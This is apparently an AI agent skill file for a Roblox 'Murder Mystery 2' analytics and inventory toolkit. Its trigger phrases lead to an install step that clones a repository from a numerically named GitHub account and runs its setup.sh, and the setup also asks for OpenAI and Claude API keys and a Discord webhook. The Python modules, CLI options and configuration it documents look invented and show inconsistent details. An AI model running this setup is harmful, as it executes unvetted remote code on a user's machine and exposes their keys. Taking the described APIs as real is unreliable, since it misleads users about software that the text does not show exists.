---
name: mm2-roblox-analytics-toolkit
description: Analytics and inventory tracking toolkit for Roblox Murder Mystery 2 gameplay optimization
triggers:
  - "help me analyze my Murder Mystery 2 inventory"
  - "set up MM2 analytics dashboard"
  - "track my Roblox MM2 knife skins collection"
  - "configure murder mystery 2 stats tracker"
  - "optimize my MM2 gameplay strategy"
  - "export my murder mystery 2 statistics"
  - "analyze MM2 win rate and performance"
  - "manage my roblox mm2 inventory data"
---

# MM2 Roblox Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This toolkit provides advanced analytics, inventory management, and strategic insights for Roblox's Murder Mystery 2 game. It includes data visualization, collection tracking, performance metrics, and AI-powered gameplay analysis.

## Installation

### Automated Setup

```bash
git clone https://github.com/8015238355/mm2-analytics-dashboard-2026.git
cd mm2-analytics-dashboard-2026
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Clone repository
git clone https://github.com/8015238355/mm2-analytics-dashboard-2026.git
cd mm2-analytics-dashboard-2026

# Install dependencies
npm install
python3 -m pip install -r requirements.txt
```

### Environment Configuration

Create a `.env` file in the project root:

```bash
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true
EXPORT_FORMAT=json
LOG_LEVEL=INFO
```

## Core Components

### 1. Analytics Engine

The analytics module processes gameplay data and generates insights.

**Python Usage:**

```python
from mm2_analytics import AnalyticsEngine, ProfileLoader

# Initialize engine
engine = AnalyticsEngine(
    data_dir=os.getenv('DATA_DIRECTORY'),
    refresh_rate=int(os.getenv('ANALYTICS_INTERVAL', 300))
)

# Load user profile
profile = ProfileLoader.load('mystery_solver_01')

# Run analytics
results = engine.analyze(
    profile=profile,
    mode='comprehensive',
    time_range='7d'
)

# Access metrics
print(f"Win Rate: {results.win_rate}%")
print(f"Total Games: {results.total_games}")
print(f"Preferred Role: {results.preferred_role}")
```

### 2. Inventory Manager

Track and optimize your MM2 item collection.

**Python Usage:**

```python
from mm2_inventory import InventoryManager, ItemFilter

# Initialize manager
inventory = InventoryManager(profile='mystery_solver_01')

# Scan inventory
inventory.scan(categories=['knife_skins', 'gamepasses'])

# Filter items
legendary_knives = inventory.filter(
    ItemFilter(
        category='knife_skins',
        rarity=['legendary', 'ancient'],
        min_value=1000
    )
)

# Get collection statistics
stats = inventory.get_stats()
print(f"Total Items: {stats.total_items}")
print(f"Collection Completion: {stats.completion_rate}%")
print(f"Estimated Value: {stats.total_value}")

# Export inventory
inventory.export('inventory_2026.json', format='json')
```

### 3. Strategy Analyzer

Analyze gameplay patterns and generate strategic recommendations.

**Python Usage:**

```python
from mm2_strategy import StrategyAnalyzer, RoleStrategy

# Initialize analyzer
analyzer = StrategyAnalyzer()

# Load strategy template
strategy = RoleStrategy(
    role='sheriff',
    template='aggressive_sheriff',
    priority='high_visibility_areas'
)

# Analyze gameplay session
session_data = analyzer.load_session('session_2026_05_15.json')
analysis = analyzer.analyze(session_data, strategy)

# Get recommendations
for rec in analysis.recommendations:
    print(f"- {rec.action}: {rec.rationale}")

# Generate heatmap
heatmap = analyzer.generate_heatmap(
    sessions=session_data,
    map_name='de_town'
)
heatmap.save('sheriff_heatmap.png')
```

## CLI Commands

### Main Command Interface

```bash
# Run analytics mode
python3 main.py --mode analytics \
    --profile mystery_solver_01 \
    --export statistics_2026.json \
    --format json \
    --verbose

# Inventory scan
python3 main.py --mode inventory \
    --profile mystery_solver_01 \
    --scan all \
    --output inventory_report.csv

# Strategy analysis
python3 main.py --mode strategy \
    --profile mystery_solver_01 \
    --role sheriff \
    --sessions 50 \
    --export strategy_insights.json

# Live tracking mode
python3 main.py --mode live \
    --profile mystery_solver_01 \
    --interval 30 \
    --dashboard
```

### Common CLI Options

```bash
Options:
  --mode          Operation mode (analytics|inventory|strategy|live)
  --profile       User profile name
  --export        Output file path
  --format        Export format (json|csv|yaml)
  --verbose       Enable verbose logging
  --log-level     Set log level (DEBUG|INFO|WARNING|ERROR)
  --config        Custom config file path
  --no-cache      Disable data caching
  --force-refresh Force data refresh
```

## Configuration

### Profile Configuration (YAML)

```yaml
# config/profiles/mystery_solver_01.yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
      exclude_duplicates: true
    - category: "gamepasses"
      active: true
  
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: ["csv", "json"]
    include_predictions: true
    ai_insights: true
  
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
      engagement_distance: "medium"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
      group_behavior: "blend_in"
  
  notifications:
    discord_webhook: ${DISCORD_WEBHOOK_URL}
    email: "user@example.com"
    on_rare_drop: true
    on_achievement: true
```

### Application Configuration (JSON)

```json
{
  "app": {
    "name": "MM2 Analytics Toolkit",
    "version": "2026.1.0",
    "data_directory": "./data",
    "cache_directory": "./cache",
    "log_directory": "./logs"
  },
  "analytics": {
    "default_time_range": "7d",
    "max_sessions": 1000,
    "enable_ai_predictions": true,
    "prediction_models": ["openai", "claude"],
    "confidence_threshold": 0.75
  },
  "inventory": {
    "auto_scan_interval": 3600,
    "value_update_source": "community_market",
    "rarity_tiers": ["common", "uncommon", "rare", "legendary", "ancient"],
    "duplicate_handling": "merge"
  },
  "api": {
    "openai": {
      "model": "gpt-4-turbo",
      "max_tokens": 2000,
      "temperature": 0.7
    },
    "claude": {
      "model": "claude-3-opus",
      "max_tokens": 4000
    }
  }
}
```

## Data Export and Visualization

### Export Analytics Data

```python
from mm2_analytics import DataExporter, ExportFormat

# Initialize exporter
exporter = DataExporter()

# Export to CSV
exporter.export_csv(
    data=results,
    filename='mm2_stats_2026.csv',
    columns=['date', 'role', 'win', 'duration', 'kills']
)

# Export to JSON with metadata
exporter.export_json(
    data=results,
    filename='mm2_stats_2026.json',
    include_metadata=True,
    pretty_print=True
)

# Export to Pandas DataFrame
df = exporter.to_dataframe(results)
print(df.describe())
```

### Generate Visualizations

```python
from mm2_visualization import ChartGenerator

# Initialize chart generator
charts = ChartGenerator()

# Win rate over time
charts.line_chart(
    data=results.time_series,
    x='date',
    y='win_rate',
    title='Win Rate Trend (Last 30 Days)',
    output='win_rate_trend.png'
)

# Role distribution pie chart
charts.pie_chart(
    data=results.role_distribution,
    labels='role',
    values='count',
    title='Role Distribution',
    output='role_distribution.png'
)

# Performance heatmap
charts.heatmap(
    data=results.performance_matrix,
    x_axis='hour_of_day',
    y_axis='day_of_week',
    values='win_rate',
    title='Performance Heatmap',
    output='performance_heatmap.png'
)
```

## AI-Powered Insights

### OpenAI Integration

```python
from mm2_ai import OpenAIAnalyzer
import os

# Initialize analyzer
ai_analyzer = OpenAIAnalyzer(
    api_key=os.getenv('API_OPENAI_KEY'),
    model='gpt-4-turbo'
)

# Get strategic recommendations
recommendations = ai_analyzer.analyze_gameplay(
    session_data=session_data,
    role='sheriff',
    context='competitive_match'
)

for rec in recommendations:
    print(f"\n{rec.title}")
    print(f"Confidence: {rec.confidence}%")
    print(f"Suggestion: {rec.suggestion}")
```

### Claude Integration for Pattern Recognition

```python
from mm2_ai import ClaudeAnalyzer
import os

# Initialize analyzer
claude = ClaudeAnalyzer(
    api_key=os.getenv('API_CLAUDE_KEY'),
    model='claude-3-opus'
)

# Analyze player behavior patterns
patterns = claude.detect_patterns(
    historical_data=inventory.get_history(days=30),
    analysis_type='behavioral'
)

print(f"Detected Patterns: {len(patterns)}")
for pattern in patterns:
    print(f"- {pattern.name}: {pattern.frequency} occurrences")
```

## Common Workflows

### Complete Session Analysis

```python
from mm2_analytics import SessionAnalyzer, ProfileLoader
from mm2_visualization import ChartGenerator
import os

def analyze_session(profile_name, session_file):
    # Load profile and session
    profile = ProfileLoader.load(profile_name)
    analyzer = SessionAnalyzer()
    session = analyzer.load_session(session_file)
    
    # Run comprehensive analysis
    analysis = analyzer.analyze(session, profile)
    
    # Generate visualizations
    charts = ChartGenerator()
    charts.generate_session_report(
        analysis=analysis,
        output_dir='./reports',
        format='png'
    )
    
    # Export detailed report
    analyzer.export_report(
        analysis=analysis,
        filename=f'session_report_{session.id}.json',
        include_insights=True
    )
    
    return analysis

# Example usage
result = analyze_session('mystery_solver_01', 'session_2026_05_15.json')
print(f"Overall Performance: {result.performance_score}/100")
```

### Inventory Valuation Tracking

```python
from mm2_inventory import InventoryManager, ValueTracker
from datetime import datetime, timedelta

def track_inventory_value(profile_name, days=30):
    inventory = InventoryManager(profile=profile_name)
    tracker = ValueTracker(inventory)
    
    # Get historical value data
    end_date = datetime.now()
    start_date = end_date - timedelta(days=days)
    
    value_history = tracker.get_value_history(
        start_date=start_date,
        end_date=end_date,
        granularity='daily'
    )
    
    # Calculate statistics
    stats = tracker.calculate_stats(value_history)
    
    print(f"Current Value: {stats.current_value:,}")
    print(f"Change ({days}d): {stats.change_percent:+.2f}%")
    print(f"Peak Value: {stats.peak_value:,} on {stats.peak_date}")
    print(f"Average Daily Change: {stats.avg_daily_change:+.2f}%")
    
    return value_history

# Example usage
history = track_inventory_value('mystery_solver_01', days=30)
```

## Troubleshooting

### Common Issues

**Issue: Analytics not updating**
```bash
# Force refresh cache
python3 main.py --mode analytics --force-refresh --no-cache

# Check data directory permissions
ls -la ${DATA_DIRECTORY}

# Verify profile exists
python3 -c "from mm2_analytics import ProfileLoader; ProfileLoader.list_profiles()"
```

**Issue: API rate limiting**
```python
# Add rate limiting configuration
from mm2_ai import RateLimiter

limiter = RateLimiter(
    max_requests_per_minute=10,
    retry_after=60
)

# Use with API calls
with limiter:
    recommendations = ai_analyzer.analyze_gameplay(session_data)
```

**Issue: Export file format errors**
```python
# Validate export format
from mm2_analytics import DataExporter, ExportFormat

exporter = DataExporter()

# Check supported formats
print(f"Supported formats: {ExportFormat.list_all()}")

# Use format validation
if exporter.validate_format('json'):
    exporter.export_json(data, 'output.json')
```

**Issue: Missing dependencies**
```bash
# Reinstall all dependencies
pip3 install -r requirements.txt --force-reinstall

# Check Python version (requires 3.9+)
python3 --version

# Verify npm packages
npm list
```

### Debug Mode

```bash
# Enable comprehensive debugging
python3 main.py --mode analytics \
    --profile mystery_solver_01 \
    --log-level DEBUG \
    --verbose \
    --debug-output debug_log.txt

# Check debug output
tail -f debug_log.txt
```

### Data Validation

```python
from mm2_analytics import DataValidator

validator = DataValidator()

# Validate profile configuration
validation_result = validator.validate_profile('mystery_solver_01')

if not validation_result.is_valid:
    print("Validation errors:")
    for error in validation_result.errors:
        print(f"- {error.field}: {error.message}")
else:
    print("Profile configuration is valid")

# Validate session data
session_validation = validator.validate_session('session_2026_05_15.json')
print(f"Session data integrity: {session_validation.integrity_score}%")
```

## Best Practices

1. **Regular Data Backups**: Export inventory and analytics data weekly
2. **Profile Management**: Use separate profiles for different gameplay styles
3. **API Key Security**: Always use environment variables for API keys
4. **Cache Management**: Clear cache periodically to ensure fresh data
5. **Performance Monitoring**: Track analytics refresh times and optimize intervals
6. **Data Privacy**: Keep personal gameplay data local and encrypted
